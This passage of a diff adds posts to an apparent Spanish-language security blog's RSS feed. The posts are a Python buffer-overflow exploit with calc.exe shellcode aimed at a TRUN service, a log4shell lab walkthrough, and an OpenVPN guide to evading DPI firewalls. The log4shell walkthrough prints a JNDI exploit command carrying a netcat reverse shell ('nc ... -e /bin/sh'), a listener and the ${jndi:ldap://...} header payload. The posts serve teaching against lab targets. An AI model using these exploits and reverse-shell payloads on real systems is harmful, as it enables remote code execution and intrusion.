+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;socket(socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;AF_INET, socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SOCK_STREAM)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;error:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;host &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;192.168.1.115&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9999&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	remote_ip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gethostbyname( host )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gaierror:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect((remote_ip , port))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;command&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;TRUN _.&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;message &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x90&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2005&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nops &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x90&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;shellcode&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2\x52\xff\xd0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;epi&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xAF\x11\x50\x62&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;exploit&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;command&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;message&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;epi&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;nops&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;shellcode
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; :
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(exploit)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; socket&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;error:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reply &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print (reply)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/63BReCz.png&#34;&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Acerca de log4shell</title>
+      <link>http://10.10.8.69:1313/posts/acerca-de-log4shell/</link>
+      <pubDate>Sat, 07 Jun 2025 10:30:00 -0600</pubDate>
+      
+      <guid>http://10.10.8.69:1313/posts/acerca-de-log4shell/</guid>
+      <description>log4shell es una falla en Apache Log4j que permite que atacantes puedan ejecutar comandos maliciosos desde servidores LDAP maliciosos, esta vulnerabilidad en sus principios fue un 0 day y debido a que log4j se encuentra en muchas aplicaciones como minecraft, Struts2, Flink entre otros su impacto ha sido muy grande.
+Como Funciona? Para esta vulnerabilidad en forma de prueba de concepto existe en github una aplicación vulnerable https://github.com/christophetd/log4shell-vulnerable-app
+git clone https://github.</description>
+      <content>&lt;p&gt;log4shell es una falla en Apache Log4j que permite que atacantes puedan ejecutar comandos maliciosos desde servidores LDAP maliciosos, esta vulnerabilidad en sus principios fue un 0 day y debido a que log4j  se encuentra en muchas aplicaciones como minecraft, Struts2, Flink entre otros su impacto ha sido muy grande.&lt;/p&gt;
+&lt;h3 id=&#34;como-funciona&#34;&gt;Como Funciona?&lt;/h3&gt;
+&lt;p&gt;Para esta vulnerabilidad en forma de prueba de concepto existe en github una aplicación vulnerable &lt;a href=&#34;https://github.com/christophetd/log4shell-vulnerable-app&#34;&gt;https://github.com/christophetd/log4shell-vulnerable-app&lt;/a&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git clone https://github.com/christophetd/log4shell-vulnerable-app.git
+docker run --name vulnerable-log4 -p 8081:8080 ghcr.io/christophetd/log4shell-vulnerable-app
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/1d851fb4f2c85bf3e0498b263832fa16012931205a239a371f42cefc5ec6ca576036b9915ebd7849c48426f3c069cdcbb5b54bf2455dc724602eaca20ae1eb6c.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;una vez descargado vamos analizar el código para ver en qué forma puede ser vulnerable&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/ace1c5899b23dc855876d6112b119c70a086b6c3696d7c36e5b5fc90300c8635d746d5c23d88c1bf4f2097b42602334d82ed4d42026256a53e82f48f2908e1d0.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;La parte que nos interesa es:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;@GetMapping&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; String &lt;span style=&#34;color:#a6e22e&#34;&gt;index&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;@RequestHeader&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;X-Api-Version&amp;#34;&lt;/span&gt;) String apiVersion) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        logger.&lt;span style=&#34;color:#a6e22e&#34;&gt;info&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Received a request for API version &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; apiVersion);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Hello, world!&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Y en especial esta ya que es la parte vulnerable :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;logger.&lt;span style=&#34;color:#a6e22e&#34;&gt;info&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Received a request for API version &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; apiVersion);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;después vamos a necesitar un servidor LDAP que nos permita ejecutar los comandos  &lt;a href=&#34;https://github.com/welk1n/JNDI-Injection-Exploit&#34;&gt;https://github.com/welk1n/JNDI-Injection-Exploit&lt;/a&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;java -jar JNDI-Injection-1.0-SNAPSHOT-all.jar -C &amp;#34;nc 172.17.0.1 4444 -e /bin/sh&amp;#34; 
+nc -lvp 4444
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/8b704fcf71dbb7ed35fde12e48b6702579dcea428aba4300bca4b2b8121304bec29426740971334b5fd1d2f67a0556bbd8e2256f623cffd925fceba73caaefed.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Solo hacemos un http request con el header X-Api-Version y con la dirección que nos proporcionó JNDI Injection&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;GET&lt;/span&gt; / &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;192.168.1.141:8081&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;X-Api-Version&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;${jndi:ldap://172.17.0.1:1389/zlrpms} &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept-Language&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;en-US,en;q=0.5&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept-Encoding&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;gzip, deflate&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Connection&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;close&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Upgrade-Insecure-Requests&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/d95ee3cf726654238c8d22e1bd33dc9ef77e30f140abd9200f28397d0bd713247747c1f2aa70d503c237969780ceac41b9e8311108044fc84c960710c28433f4.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/40068b8357a248e64f7103c590e433798614cc565f55a3d07a81a5ef5dbc868bac37cb6cc696f2495e53719253fe2ed82070cfa31e6b09ae7e8ada788d881be5.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;debido a que la vulnerabilidad ya se encuentra arreglada en las nuevas versiones de Log4j  solo queda actualizar&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Cómo instalar un servidor OpenVPN y evadir los firewalls (DPI)</title>
+      <link>http://10.10.8.69:1313/posts/c%C3%B3mo-instalar-un-servidor-openvpn-y-evadir-los-firewalls-dpi/</link>
+      <pubDate>Sat, 07 Jun 2025 10:30:00 -0600</pubDate>
+      
+      <guid>http://10.10.8.69:1313/posts/c%C3%B3mo-instalar-un-servidor-openvpn-y-evadir-los-firewalls-dpi/</guid>
+      <description>Se mostrará como instalar OpenVPN y como evadir los Firewall que suelen usar Deep Packet Inspection para identificar el tipo de protocolo que son los paquetes, muchos de estos suelen bloquear las conexiones VPN, el funcionamiento se basa en identificar el handshake de OpenVPN entonces si logramos ofuscar el handshake podemos saltarnos esa restricción, por suerte se implemento tls-crypt-v2 lo que reduce significativamente la dificultad.
+Instalacion Lo primero es instalar openvpn y easy-rsa</description>
+      <content>&lt;p&gt;Se mostrará como instalar OpenVPN y como evadir los Firewall que suelen usar Deep Packet Inspection para identificar el tipo de protocolo que son los paquetes, muchos de estos suelen bloquear las conexiones VPN, el funcionamiento se basa en identificar el handshake de OpenVPN entonces si logramos ofuscar el handshake podemos saltarnos esa restricción, por suerte se implemento tls-crypt-v2 lo que reduce significativamente la dificultad.&lt;/p&gt;
+&lt;h2 id=&#34;instalacion&#34;&gt;Instalacion&lt;/h2&gt;
+&lt;p&gt;Lo primero es instalar openvpn y easy-rsa&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo apt install openvpn easy-rsa
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Lo primero configuramos easyrsa&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cp -r /usr/share/easy-rsa /etc/
+cd /etc/easy-rsa/
+./easyrsa init-pki
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Generamos el certificado y la clave de la autoridad de certificación&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cd /etc/easy-rsa/
+
+./easyrsa build-ca nopass
+
+./easyrsa gen-dh
+
+./easyrsa build-server-full server nopass
+
+openvpn --genkey secret /etc/easy-rsa/pki/ta.key
+
+./easyrsa gen-crl
+
+cp -rp /etc/easy-rsa/pki/{ca.crt,dh.pem,ta.key,crl.pem,issued,private} 
+
+/etc/openvpn/server/
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;creacion-del-handshake-encryption--tls-crypt-v2&#34;&gt;Creacion del handshake encryption  [tls-crypt-v2]&lt;/h2&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Entonces nos ubicamos en
+cd /etc/openvpn/server
+Para generar el cifrado o el cifrado de handsacke  para el lado del server es 
+openvpn --genkey tls-crypt-v2-server handshake_encryption_server.key
+
+Para el lado del cliente es 
+openvpn --tls-crypt-v2 handshake_encryption_server.key --genkey tls-crypt-v2-client handshake_encryption_client.key
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;creacion-de-los-cientes-para-openvpn&#34;&gt;Creacion de los cientes para openvpn&lt;/h2&gt;
+&lt;p&gt;para este caso nos debemos ubicar en la carpeta que copiamos de easyrsa&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cd /etc/easy-rsa
+./easyrsa build-client-full User1 nopass
+./easyrsa build-client-full User2 nopass
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ahora vamos a copiar a los usuarios a la carpeta de openvpn, cada uno en su respectiva carpeta&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mkdir /etc/openvpn/client/{User1,User2}
+
+cp -rp /etc/easy-rsa/pki/{ca.crt,issued/User1.crt,private/User1.key} /etc/openvpn/client/User1
+
+cp -rp /etc/easy-rsa/pki/{ca.crt,issued/User2.crt,private/User2.key} /etc/openvpn/client/User2
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;editar-la-configuracion&#34;&gt;Editar la configuracion&lt;/h2&gt;
+&lt;p&gt;En este caso es mas facil usar la plantilla de configuracion de OpenVPN&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cp /usr/share/doc/openvpn/examples/sample-config-files/server.conf /etc/openvpn/server/
+cd /etc/openvpn/server/
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ubicamos los siguientes parámetros y los modificamos un ejemplo:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ca ca.crt
+cert issued/server.crt
+key private/server.key  # This file should be kept secret
+dh dh.pem
+tls-crypt-v2 handshake_encryption_server.key
+push &amp;#34;dhcp-option DNS 1.1.1.1&amp;#34;
+tls-auth ta.key 0
+
+log-append  /var/log/openvpn/openvpn.log
+server-ipv6 fd93:b56d:6365::/64
+push &amp;#34;dhcp-option DNS6 2606:4700:4700::1111&amp;#34;
+push &amp;#34;dhcp-option DNS6 2606:4700:4700::1001&amp;#34;
+push &amp;#34;redirect-gateway ipv6 def1 bypass-dhcp&amp;#34;
+push &amp;#34;route-ipv6 fd93:b56d:6365::/64&amp;#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ejecutamos este comando para hablilitar el server y verificamos que este funcionando&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo systemctl start openvpn-server@server.service
+
+root@i:/etc/openvpn/server# sudo service openvpn-server@server status
+● openvpn-server@server.service - OpenVPN service for server
+     Loaded: loaded (/usr/lib/systemd/system/openvpn-server@.service; disabled; preset: enabled)
+     Active: active (running) since Wed 2024-10-23 00:55:49 UTC; 4min 39s ago
+       Docs: man:openvpn(8)
+             https://openvpn.net/community-resources/reference-manual-for-openvpn-2-6/
+             https://community.openvpn.net/openvpn/wiki/HOWTO
+   Main PID: 20333 (openvpn)
+     Status: &amp;#34;Initialization Sequence Completed&amp;#34;
+      Tasks: 1 (limit: 482)
+     Memory: 1.4M (peak: 1.7M)
+        CPU: 32ms
+     CGroup: /system.slice/system-openvpn\x2dserver.slice/openvpn-server@server.service
+             └─20333 /usr/sbin/openvpn --status /run/openvpn-server/status-server.log --status-version 2 --suppress-timestamps --config server.conf
+
+Oct 23 00:55:48 Server systemd[1]: Starting openvpn-server@server.service - OpenVPN service for server...
+Oct 23 00:55:49 Server systemd[1]: Started openvpn-server@server.service - OpenVPN service for server.
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;crear-el-ovpn&#34;&gt;Crear el ovpn&lt;/h2&gt;
+&lt;p&gt;Los archivospara crear el  .ovpn estan en /etc/openvpn/client/User1&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@Server:/etc/openvpn/client/User1# ls
+User1.crt  User1.key  ca.crt
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;lo mismo con tls-crypt-v2 es el archivo que creamos como handshake_encryption_client.key&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; cat handshake_encryption_client.key
+-----BEGIN OpenVPN tls-crypt-v2 client key-----
+pKYdZklpqoO/XhsJnzn/RX7zTPsqLxgL+0PG3tuzqwyX27IscNXeViVwCwWAYwHU
+IdvcrL6AgxgA22QQ.............
+-----END OpenVPN tls-crypt-v2 client key-----
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;creación-del-ovpn&#34;&gt;Creación del .ovpn&lt;/h4&gt;
+&lt;p&gt;para crear el archivo de ovpn se debe usar el siguiente formato y solo modificar los campos de las claves, certificados y remote.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;client
+dev tun
+proto udp
+remote address port
+resolv-retry infinite
+nobind
+persist-key
+persist-tun
+verb 4
+data-ciphers-fallback AES-128-CBC
+data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
+tls-cipher &amp;#34;DEFAULT:@SECLEVEL=0&amp;#34;
+auth SHA256
+key-direction 1
+&amp;lt;ca&amp;gt;
+-----BEGIN CERTIFICATE-----
+MIIDSzCCAjOgAwIBAgIUAbBDafoK+M02UQCliU5DLxMZ2hQwDQYJKoZIhvcNAQEL
+BQAwFjEUMBIGA1UEAwwLRWFzeS1SU0EgQ0EwHhcNMjQxMDIzMDAxODI1WhcNMz....
+-----END CERTIFICATE-----
+&amp;lt;/ca&amp;gt;
+&amp;lt;cert&amp;gt;
+Certificate:
+    Data:......
+-----BEGIN CERTIFICATE-----
+MIIDUzCCAjugAwIBAgIQKEeHa0xsNPRzkQFHiHubCTANBgkqhkiG9w0BAQsFADAW.........
+-----END CERTIFICATE-----
+&amp;lt;/cert&amp;gt;
+&amp;lt;key&amp;gt;
+-----BEGIN PRIVATE KEY-----
+MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDe8LAxZblRxaDj
+8NEaq0Mq4.......
+-----END PRIVATE KEY-----
+&amp;lt;/key&amp;gt;
+&amp;lt;tls-crypt-v2&amp;gt;
+-----BEGIN OpenVPN tls-crypt-v2 client key-----
+pKYdZklpqoO/XhsJnzn/RX7zTPsqLxgL+0PG3tuzqwyX27IscNXeViVwCwWAYwHU.
+Idvc.................
+-----END OpenVPN tls-crypt-v2 client key-----
+&amp;lt;/tls-crypt-v2&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sysctl net.ipv4.ip_forward=1
+iptables -t nat -I POSTROUTING  -o ens5 -j MASQUERADE
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;deteccion-por-deep-packet-inspection--dpi&#34;&gt;Deteccion por Deep Packet Inspection  (DPI)&lt;/h2&gt;
+&lt;p&gt;Los firewall usan Deep Packet Inspection para reconocer ciertos protocolos&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/e3938bc2bb3eae0744a63c2b4563ee8362cdda7453ab06b4adb34b890796d6fdcbb31ad740c4acde96dc746179c5eeb695acb3b459c4e633d3d24ac5e6444d90.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Desde ver el SNI en el Hello Client, identificar P2P, SSH, QUIC, etc.&lt;/p&gt;
+&lt;p&gt;En este caso se detectó la conexión de openvpn y esto se debe a que el handshake tiene patrones muy reconocibles.&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/8e739d64413c7701beb26d276162ace7bb861ea1bc39eb7f22699e8d8b8270631c537c27f1d86e04b70fedbb7af084254a0a3a9c30a09f0da59d550c0e453b79.png&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Lo primero que tenemos que hacer es cambiar el puerto porque el puerto default es de openvpn.&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;Name&#34; src=&#34;http://10.10.8.69:1313/images/cf7fb424a3f3c78234f4af9bb1db37233d9da8724da4209b1e880faf1eae8285b3040d524144153e0e86cf99238cc24deb956a03c4a5a06a84dbbc756308dfc0.png&#34;&gt;&lt;/p&gt;
